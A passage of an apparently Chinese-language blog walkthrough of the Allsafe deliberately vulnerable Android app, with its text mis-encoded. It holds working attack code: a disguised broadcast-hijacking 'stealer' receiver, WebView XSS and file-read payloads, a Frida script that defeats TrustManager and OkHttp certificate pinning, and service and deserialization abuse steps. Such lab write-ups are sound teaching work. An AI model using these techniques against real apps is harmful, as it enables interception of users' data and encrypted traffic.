class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p><code>queryBroadcastReceivers(intent, 0)</code> ä¼šè¿”å›ä¸€ä¸ª <code>List&lt;ResolveInfo&gt;</code>ï¼Œé‡Œé¢åŒ…å«äº†åŒ¹é…è¯¥ Intent çš„æ¥æ”¶å™¨çš„è¯¦ç»†ä¿¡æ¯ï¼ˆåŒ…åã€ç±»åç­‰ï¼‰ã€‚ç„¶åä»£ç éå†è¿™ä¸ªåˆ—è¡¨ï¼Œ<code>intent.setComponent(cn)</code> å¯¹æ¯ä¸ªæ¥æ”¶å™¨ æ„é€ æ˜¾å¼ Intent å¹¶å‘é€å¹¿æ’­</p><p>å†™ä¸€ä¸ªç›‘å¬å™¨ï¼Œä¸“é—¨ç›‘å¬ <code>infosecadventures.allsafe.action.PROCESS_NOTE</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">manifest</span> <span class="hljs-attr">xmlns:android</span>=<span class="hljs-string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span><br><span class="hljs-tag">    <span class="hljs-attr">package</span>=<span class="hljs-string">&quot;com.example.stealer&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">application</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:allowBackup</span>=<span class="hljs-string">&quot;true&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:label</span>=<span class="hljs-string">&quot;System Service&quot;</span></span><br><span class="hljs-tag">        <span class="hljs-attr">android:theme</span>=<span class="hljs-string">&quot;@style/Theme.AppCompat.Light.NoActionBar&quot;</span>&gt;</span><br>        <br>        <span class="hljs-tag">&lt;<span class="hljs-name">activity</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.MainActivity&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">category</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">activity</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">receiver</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;.StealerReceiver&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">android:exported</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">intent-filter</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">android:name</span>=<span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span> /&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">intent-filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">receiver</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">application</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">manifest</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.stealer;<br><br><span class="hljs-keyword">import</span> android.content.BroadcastReceiver;<br><span class="hljs-keyword">import</span> android.content.Context;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StealerReceiver</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BroadcastReceiver</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;STEALER&quot;</span>;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯ç›®æ ‡å¹¿æ’­</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;infosecadventures.allsafe.action.PROCESS_NOTE&quot;</span>.equals(intent.getAction())) &#123;<br>            <br>            <span class="hljs-comment">// æå–å¹¶æ‰“å°æ‰€æœ‰æ•°æ®</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;server&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">note</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;note&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">notification</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;notification_message&quot;</span>);<br>            <br>            Log.i(TAG, <span class="hljs-string">&quot;=====================================&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;ã€å¹¿æ’­åŠ«æŒæˆåŠŸã€‘&quot;</span>);<br>            Log.i(TAG, <span class="hljs-string">&quot;æœåŠ¡å™¨åœ°å€: &quot;</span> + server);<br>            Log.i(TAG, <span class="hljs-string">&quot;ç”¨æˆ·ç¬”è®°: &quot;</span> + note);<br>            Log.i(TAG, <span class="hljs-string">&quot;é€šçŸ¥æ¶ˆæ¯: &quot;</span> + notification);<br>            Log.i(TAG, <span class="hljs-string">&quot;=====================================&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¿å­˜ç¬”è®°ï¼Œå³å¯åœ¨ç›‘å¬å™¨çš„ logcat ä¸­æ‰“å°</p><p><img src="/img/IvS8bqyFloAwhpxmA0gcOsianlh.png"></p><h1 id="Vulnerable-WebView"><a href="#Vulnerable-WebView" class="headerlink" title="Vulnerable WebView"></a>Vulnerable WebView</h1><p>webview æœ‰ä¸¤ä¸ªåŠ è½½é€»è¾‘ï¼Œå¦‚æœæ˜¯ URI åˆ™è°ƒç”¨ <code>loadUrl</code> æ–¹æ³•ï¼Œå¦åˆ™éƒ½å½“ html ä»£ç å¤„ç†ï¼Œè€Œä¸”ä¸¤è€…éƒ½æ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p><img src="/img/OyS7bNYFDoivuZxfE7KcIJbansb.png"></p><p>ç›´æ¥æ‰§è¡Œ XSS</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;script&gt;alert(<span class="hljs-string">&quot;XSS&quot;</span>)&lt;/script&gt;ï»¿<br></code></pre></td></tr></table></figure><p><img src="/img/Vv0TbMUymodChXx3Y1AcDEnCn7e.png"></p><p>è°ƒç”¨ file åè®®è¯»å–æ–‡ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">file:<span class="hljs-comment">///etc/hosts</span><br></code></pre></td></tr></table></figure><p><img src="/img/HViPbM5o7ofoQZxQqkAcxhjInch.png"></p><h1 id="Certificate-Pinning"><a href="#Certificate-Pinning" class="headerlink" title="Certificate Pinning"></a>Certificate Pinning</h1><p>è¯ä¹¦ç»‘å®šï¼Œå¦‚æœç›´æ¥ç‚¹å‡»å‘é€ï¼Œä½†æ˜¯æŠ“åŒ…çš„æ—¶å€™æ˜¾ç¤ºæŠ¥é”™</p><p><img src="/img/Q9mGbkCnboCEaYxgc41ck0a7nEf.png"></p><p>åœ¨ <code>onCreateView</code> ä¸­ä¼šè°ƒç”¨ <code>extractPeerCertificateChain</code></p><p><img src="/img/PD0ebT2g0oxjdJxX4C8cfxzInuh.png"></p><p>è®¾ç½®è¯ä¹¦å›ºå®šé…ç½®ï¼Œå°† <code>httpbin.io</code> åŸŸåå¯¹åº”çš„è¯ä¹¦å“ˆå¸Œé…ç½®ä¸º <code>INVALID_HASH</code>ï¼Œè¿™æ ·å¿…ç„¶ä¼šå¯¼è‡´ SSL è¯ä¹¦éªŒè¯é”™è¯¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">**<span class="hljs-keyword">private</span>** **<span class="hljs-keyword">void</span>** extractPeerCertificateChain() &#123;<br><br>    <span class="hljs-type">OkHttpClient</span> <span class="hljs-variable">okHttpClient</span> <span class="hljs-operator">=</span> **<span class="hljs-keyword">new</span>** OkHttpClient.Builder().certificatePinner(**<span class="hljs-keyword">new</span>** CertificatePinner.Builder().add(<span class="hljs-string">&quot;httpbin.io&quot;</span>, INVALID_HASH).build()).build();<br><br>    <span class="hljs-type">Request</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> **<span class="hljs-keyword">new</span>** Request.Builder().url(<span class="hljs-string">&quot;https://httpbin.io/json&quot;</span>).build();<br><br>    okHttpClient.newCall(request).enqueue(**<span class="hljs-keyword">new</span>** AnonymousClass2());<br><br>&#125;<br></code></pre></td></tr></table></figure><p><code>OkHttp</code> æ¡†æ¶åœ¨å‘èµ·è¯·æ±‚çš„æ—¶å€™ä¼šè°ƒç”¨ <code>CertificatePinner.check()</code>ï¼Œä¼šå¯¹æœåŠ¡å™¨è¿”å›çš„è¯ä¹¦ä¸æœ¬åœ°ç»‘å®šçš„è¯ä¹¦å¯¹æ¯”</p><p><img src="/img/WpF7bCCjNoKHE9xF33Kcxae8nhg.png"></p><p>æ›¿æ¢ <code>TrustManager</code> é€»è¾‘ä¸ºæ— æ ¡éªŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] é€šç”¨è¯ä¹¦ç»‘å®šç»•è¿‡è„šæœ¬å¯åŠ¨ (æ”¯æŒå¤šåœºæ™¯)&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ”¯æŒ: SSLContextæ ¡éªŒ + OkHttp3 CertificatePinner&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-comment">// æ›¿æ¢ SSLContext TrustManager ç»•è¿‡è¯ä¹¦æ ¡éªŒ</span><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// åˆ›å»ºæ— æ ¡éªŒçš„è‡ªå®šä¹‰ TrustManager</span><br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">CustomTrustManager</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">registerClass</span>(&#123;<br>                <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;com.example.frida.CustomTrustManager&#x27;</span>,<br>                <span class="hljs-attr">implements</span>: [<span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.X509TrustManager&quot;</span>)],<br>                <span class="hljs-attr">methods</span>: &#123;<br>                    <span class="hljs-attr">checkClientTrusted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) &#123;<br>                        <span class="hljs-comment">// ç©ºå®ç°ï¼šä¸æ ¡éªŒå®¢æˆ·ç«¯è¯ä¹¦</span><br>                    &#125;,<br>                    <span class="hljs-attr">checkServerTrusted</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">chain, authType</span>) &#123;<br>                        <span class="hljs-comment">// ç©ºå®ç°ï¼šä¸æ ¡éªŒæœåŠ¡å™¨è¯ä¹¦ï¼ˆæ ¸å¿ƒç»•è¿‡é€»è¾‘ï¼‰</span><br>                    &#125;,<br>                    <span class="hljs-attr">getAcceptedIssuers</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>                        <span class="hljs-keyword">return</span> []; <span class="hljs-comment">// è¿”å›ç©ºåˆ—è¡¨ï¼Œä¸é™åˆ¶ä¿¡ä»»CA</span><br>                    &#125;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-keyword">const</span> trustManagerInstance = <span class="hljs-title class_">CustomTrustManager</span>.$new();<br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">SSLContext</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;javax.net.ssl.SSLContext&quot;</span>);<br><br>            <span class="hljs-comment">// Hook SSLContext åˆå§‹åŒ–æ–¹æ³•ï¼Œæ›¿æ¢ä¿¡ä»»ç®¡ç†å™¨</span><br>            <span class="hljs-title class_">SSLContext</span>.<span class="hljs-property">init</span>.<span class="hljs-title function_">overload</span>(<br>                <span class="hljs-string">&quot;[Ljavax.net.ssl.KeyManager;&quot;</span>,<br>                <span class="hljs-string">&quot;[Ljavax.net.ssl.TrustManager;&quot;</span>,<br>                <span class="hljs-string">&quot;java.security.SecureRandom&quot;</span><br>            ).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">keyManagers, trustManagers, secureRandom</span>) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [SSLContext] æ‹¦æˆªåˆå§‹åŒ–ï¼Œæ›¿æ¢ä¸ºæ— æ ¡éªŒTrustManager&quot;</span>);<br>                <span class="hljs-comment">// å¼ºåˆ¶ä½¿ç”¨è‡ªå®šä¹‰TrustManagerï¼Œå¿½ç•¥åŸå§‹é…ç½®</span><br>                <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">init</span>(keyManagers, [trustManagerInstance], secureRandom);<br>            &#125;;<br><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [SSLContext] ç»•è¿‡é€»è¾‘åŠ è½½æˆåŠŸ&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] [SSLContext] ç»•è¿‡é€»è¾‘åŠ è½½å¤±è´¥: &quot;</span> + e.<span class="hljs-property">message</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-comment">// OkHttp3 CertificatePinner ä¸“å±ç»•è¿‡</span><br>        <span class="hljs-comment">// ======================================</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> <span class="hljs-title class_">CertPinner</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;okhttp3.CertificatePinner&quot;</span>);<br><br>            <span class="hljs-comment">// Hook check æ–¹æ³•ï¼ˆç›´æ¥è·³è¿‡æ ¡éªŒï¼‰</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">check</span>) &#123;<br>                <span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">check</span>.<span class="hljs-property">overloads</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">overload</span>) =&gt;</span> &#123;<br>                    overload.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">...args</span>) &#123;<br>                        <span class="hljs-keyword">const</span> hostname = args[<span class="hljs-number">0</span>] || <span class="hljs-string">&quot;æœªçŸ¥åŸŸå&quot;</span>;<br>                        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[+] [OkHttp3] ç»•è¿‡ CertificatePinner.check | åŸŸå: <span class="hljs-subst">$&#123;hostname&#125;</span>`</span>);<br>                        <span class="hljs-comment">// ç©ºå®ç°ï¼šä¸æ‰§è¡ŒåŸæ ¡éªŒé€»è¾‘</span><br>                    &#125;;<br>                &#125;);<br>            &#125;<br><br>            <span class="hljs-comment">// Hook findMatchingPins æ–¹æ³•ï¼ˆè¿”å›ç©ºåˆ—è¡¨ï¼‰</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">findMatchingPins</span>) &#123;<br>                <span class="hljs-title class_">CertPinner</span>.<span class="hljs-property">findMatchingPins</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&quot;java.lang.String&quot;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">hostname</span>) &#123;<br>                    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[+] [OkHttp3] ç»•è¿‡ CertificatePinner.findMatchingPins | åŸŸå: <span class="hljs-subst">$&#123;hostname&#125;</span>`</span>);<br>                    <span class="hljs-comment">// è¿”å›ç©ºåˆ—è¡¨ï¼Œè®©OkHttpè®¤ä¸ºæ— è¯ä¹¦ç»‘å®š</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>).$new();<br>                &#125;;<br>            &#125;<br><br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] [OkHttp3] ç»•è¿‡é€»è¾‘åŠ è½½æˆåŠŸ&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[-] [OkHttp3] ç»•è¿‡é€»è¾‘åŠ è½½å¤±è´¥ (å¯èƒ½æœªä½¿ç”¨OkHttp3): &quot;</span> + e.<span class="hljs-property">message</span>);<br>        &#125;<br><br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ‰€æœ‰ç»•è¿‡é€»è¾‘åŠ è½½å®Œæˆï¼Œç­‰å¾…ç›®æ ‡è¯·æ±‚...&quot;</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] ======================================&quot;</span>);<br>    &#125;);<br>&#125;, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶å°±å¯ä»¥æ­£å¸¸è®¿é—®ï¼Œä½†ç½‘ç«™å¥½åƒæ— æ³•è®¿é—®äº†</p><p><img src="/img/YMkvbZX5wozwNUxK7sic7dMSnQb.png"></p><h1 id="Weak-Cryptography"><a href="#Weak-Cryptography" class="headerlink" title="Weak Cryptography"></a>Weak Cryptography</h1><p>ç›´æ¥ç¡¬ç¼–ç  AES å¯†é’¥</p><p><img src="/img/MTCPbv7M8oeKuCxgRfAcpdW9nSh.png"></p><p><img src="/img/JtilbE35xoXmKFxCccscx33Kn7O.png"></p><p>éšæœºæ•°çš„è¯ï¼Œç›´æ¥ hook å›ºå®šè¿”å›å€¼</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">WeakCryptography</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;infosecadventures.allsafe.challenges.WeakCryptography&quot;</span>);<br><span class="hljs-title class_">WeakCryptography</span>[<span class="hljs-string">&quot;randomNumber&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`WeakCryptography.randomNumber is called`</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;6666666&quot;</span>;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/img/CaLabOJFToPeNixiCckcmm3XnLd.png"></p><h1 id="Insecure-Service"><a href="#Insecure-Service" class="headerlink" title="Insecure Service"></a><strong>Insecure Service</strong></h1><p>å®šä¹‰äº†ä¸€ä¸ªå½•éŸ³æœåŠ¡</p><p><img src="/img/LWkgbYtTCoZ9eZxbKB1cM6hBn8I.png"></p><p>ä¸€å¼€å§‹ä¼šæ£€æµ‹æœ‰æ²¡æœ‰å¯¹åº”çš„æƒé™ï¼Œæ²¡æœ‰ä¼šå»ç”³è¯·</p><p><img src="/img/SFXAbhl5yoZyacxmbePcnKBon5e.png"></p><p>å¹¶ä¸”è¿™ä¸ªæœåŠ¡ä¹Ÿæ˜¯å¯¼å‡ºçš„ï¼Œå¯ä»¥å¤–éƒ¨è°ƒç”¨</p><p><img src="/img/EOmEb0VkyoU6nUxdzqxc9zCungd.png"></p><p>ç›´æ¥ç”¨ adb è°ƒç”¨è¯¥æœåŠ¡</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">adb shell am startservice -n infosecadventures.allsafe/.challenges.RecorderService<br></code></pre></td></tr></table></figure><p><img src="/img/TZiMbgd7moSYCXxLT2yc1POhnYc.png"></p><h1 id="Object-Serialization"><a href="#Object-Serialization" class="headerlink" title="Object Serialization"></a><strong>Object Serialization</strong></h1><p>ç®€å•çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¼šæ£€æµ‹ <code>user.role</code> æ˜¯å¦ä¸º <code>ROLE_EDITOR</code>ï¼Œä½†æ˜¯ user.role çš„é»˜è®¤å€¼æ˜¯ <code>ROLE_AUTHOR</code>ï¼Œéœ€è¦è‡ªå·±æ„é€ ä¸€ä¸ªåºåˆ—åŒ–å¯¹è±¡</p><p><img src="/img/TFasbf7JHof4gkxNIMVca5eenog.png"></p><p>é¦–å…ˆè·å–åºåˆ—åŒ–å¯¹è±¡æ‰€åœ¨ç›®å½•</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">ContextWrapper</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.content.ContextWrapper&quot;</span>);<br>    <span class="hljs-title class_">ContextWrapper</span>.<span class="hljs-property">getExternalFilesDir</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">type</span>) &#123;<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getExternalFilesDir</span>(type);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[+] getExternalFilesDir called, result: &quot;</span> + result);<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;;<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/img/B1C1bbMUMoT7ujxpKUkcx5K0nma.png"></p><p><code> /storage/emulated/0/Android/data/infosecadventures.allsafe/files</code></p><p>ç„¶åå†æ„é€ åºåˆ—åŒ–å¯¹è±¡ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä¼ ä¸Š user.dat å LOAD æŒ‰é’®å°±æŒ‰ä¸äº†äº†ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span 